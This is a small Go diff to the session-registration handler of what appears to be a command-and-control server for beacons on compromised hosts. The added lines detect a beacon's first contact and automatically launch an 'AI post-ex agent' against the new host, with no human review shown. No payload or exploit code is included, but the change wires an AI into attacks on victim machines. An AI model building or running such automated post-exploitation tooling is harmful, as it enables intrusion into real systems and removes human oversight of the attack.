@@ -80,6 +80,7 @@ func (rl *runningListener) handleRegister(w http.ResponseWriter, r *http.Request
 		}
 	}
 	lid := rl.l.ID
+	isNew, _ := rl.mgr.db.C2SessionExists(info.SessionID)
 	if err := rl.mgr.db.UpsertC2Session(&db.C2Session{
 		ListenerID:  &lid,
 		SessionID:   info.SessionID,
@@ -101,6 +102,10 @@ func (rl *runningListener) handleRegister(w http.ResponseWriter, r *http.Request
 		return
 	}
 	rl.mgr.runAutoTasks(rl.l.ID, info.SessionID)
+	// first contact only: hand the new host to the platform's AI post-ex agent
+	if isNew && AutoPostex != nil {
+		go AutoPostex(rl.l.ID, info.SessionID, info.Hostname)
+	}
 	tasks, _ := rl.mgr.db.ClaimC2Tasks(info.SessionID, 10)
 	writeJSON(w, 200, map[string]any{"sid": info.SessionID, "tasks": beaconTasks(tasks)})
 }
